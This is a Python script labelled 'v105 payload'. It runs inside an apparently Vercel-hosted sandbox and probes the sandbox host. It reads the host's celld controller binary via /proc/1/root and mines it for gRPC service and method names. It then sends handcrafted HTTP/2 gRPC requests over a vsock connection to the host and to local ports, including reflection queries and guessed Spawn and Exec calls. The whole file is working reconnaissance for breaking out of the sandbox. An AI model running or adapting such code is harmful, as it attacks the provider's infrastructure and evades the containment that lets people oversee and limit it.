# -*- coding: utf-8 -*-
"""v105 payload: celld proto 全量提取 + gRPC reflection + 精选方法探测
P1 celld 提取 gRPC 路径/proto/Service 名 -> /vercel/sandbox/v105p3.out
P2 23456/2050 gRPC reflection ListServices 探测
P3 基于 P1 提取的路径精选探测 23456 (RST 立即停)
输出 /vercel/sandbox/v105c.out"""
import os, socket, struct, time, subprocess, signal, re

OUT = '/vercel/sandbox/v105c.out'
P3OUT = '/vercel/sandbox/v105p3.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
f3 = open(P3OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(180)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def h2_frame(t, flags, stream, payload):
    return struct.pack('>I', len(payload))[1:] + bytes([t, flags]) + struct.pack('>I', stream) + payload


def grpc_req(port, path, body=b'', t=1.5):
    """H2 POST + application/grpc, 收到 RST/GOAWAY 立即停"""
    try:
        s = socket.socket(40, socket.SOCK_STREAM) if port < 10000 else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        if port < 10000:
            s.connect((2, port))
        else:
            s.connect(('127.0.0.1', port))
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(h2_frame(4, 0, 0, b''))
        try:
            s.recv(1024)
            s.sendall(h2_frame(4, 1, 0, b''))
        except Exception:
            pass
        pv = path.encode()
        hp = b'\x83\x86' + b'\x44' + bytes([len(pv)]) + pv + b'\x41\x09localhost'
        hp += b'\x40' + b'\x0ccontent-type' + b'\x10application/grpc'
        s.sendall(h2_frame(1, 0x4, 1, hp))  # HEADERS END_HEADERS
        if body:
            s.sendall(h2_frame(0, 0x1, 1, body))  # DATA END_STREAM
        d2 = b''
        done = False
        try:
            while len(d2) < 65536 and not done:
                c = s.recv(8192)
                if not c:
                    break
                d2 += c
                # 解析是否已收 RST_STREAM(2)/GOAWAY(7)/DATA(0) trailer
                off = 0
                while off + 9 <= len(d2):
                    ln = int.from_bytes(d2[off:off + 3], 'big')
                    typ = d2[off + 3]
                    if typ in (2, 7):
                        done = True
                    off += 9 + ln
        except Exception:
            pass
        info = []
        off = 0
        while off + 9 <= len(d2):
            ln = int.from_bytes(d2[off:off + 3], 'big')
            typ = d2[off + 3]
            fl = d2[off + 4]
            pay = d2[off + 9:off + 9 + ln]
            if typ == 1:
                info.append('HDR[%s]' % pay.hex()[:160])
            elif typ == 0:
                info.append('DATA[%s]' % pay[:120].hex())
            elif typ == 7:
                info.append('GOAWAY[%s]' % pay[-4:].hex())
            elif typ == 2:
                info.append('RST[%s]' % pay[:4].hex())
            else:
                info.append('T%d' % typ)
            off += 9 + ln
        log('GRPC %s %s -> %dB %s' % ('p%d' % port, path, len(d2), ';'.join(info)[:300]))
        s.close()
        return d2
    except Exception as e:
        log('GRPC %s %s EXC %s' % ('p%d' % port, path, type(e).__name__))
        return b''


# ---------- P1 celld 全量提取 ----------
log('=== P1 celld extract ===')
try:
    fp = '/proc/1/root/opt/vercel/celld'
    with open(fp, 'rb') as fh:
        blob = fh.read()
    log('celld size %d' % len(blob))
    hits = set()
    # gRPC 注册完整路径 /pkg.Service/Method
    for m in re.finditer(rb'/([a-z][a-z0-9.]*\.[A-Z][A-Za-z0-9]*)/([A-Z][A-Za-z0-9]+)', blob):
        hits.add(b'GRPC ' + m.group(0))
    # proto 文件路径
    for m in re.finditer(rb'[A-Za-z0-9_/.-]+\.proto', blob):
        hits.add(b'PROTO ' + m.group(0))
    # Service 类型名 (go 注册表)
    for m in re.finditer(rb'[A-Z][A-Za-z0-9]{3,}Service\b', blob):
        hits.add(b'SVCTYPE ' + m.group(0))
    # package 前缀 xxx.v1.
    for m in re.finditer(rb'[a-z][a-z0-9]*(?:\.[a-z0-9]+){1,4}\.v\d\.', blob):
        hits.add(b'PKG ' + m.group(0))
    # 含 sandbox/cell/spawn/controller 的路径串
    for m in re.finditer(rb'[A-Za-z0-9_/.{}()-]{8,}', blob):
        s = m.group(0)
        sl = s.lower()
        if any(k in sl for k in (b'sandbox', b'cell', b'spawn', b'controller', b'processes')):
            if len(s) < 150:
                hits.add(b'K ' + s)
    log('total unique hits: %d' % len(hits))
    n = 0
    for s in sorted(hits):
        f3.write(s.decode(errors='replace') + '\n')
        n += 1
    f3.flush()
    log('P3 file written %d lines' % n)
except Exception as e:
    log('P1 EXC %s' % type(e).__name__)

# ---------- P2 gRPC reflection ----------
log('=== P2 reflection ===')
# list_services: field 6 (wire 2, len 0) 空消息
ref_body = b'\x00\x00\x00\x00\x00\x32\x00'
for port in (23456, 2050):
    grpc_req(port, '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo', ref_body, t=2.0)
    grpc_req(port, '/grpc.reflection.v1.ServerReflection/ServerReflectionInfo', ref_body, t=2.0)

# ---------- P3 精选探测 ----------
log('=== P3 selected probes ===')
try:
    cands = []
    for ln in open(P3OUT, encoding='utf-8', errors='replace'):
        ln = ln.strip()
        if ln.startswith('GRPC '):
            cands.append(ln[5:])
        elif ln.startswith('SVCTYPE '):
            cands.append(ln[8:])
    seen = set()
    sel = []
    for c in cands:
        if c not in seen:
            seen.add(c)
            sel.append(c)
    log('candidates: %d' % len(sel))
    # 完整路径优先, 方法名补全
    paths = []
    for c in sel:
        if '/' in c:
            paths.append(c)
        elif c.endswith('Service'):
            for meth in ('Status', 'List', 'Get', 'Create', 'Spawn', 'Exec'):
                paths.append(c + '/' + meth)
    for p in paths[:24]:
        grpc_req(23456, p, b'\x00\x00\x00\x00\x00', t=1.2)
except Exception as e:
    log('P3 EXC %s' % type(e).__name__)

log('V105C_DONE')
f.close()
f3.close()
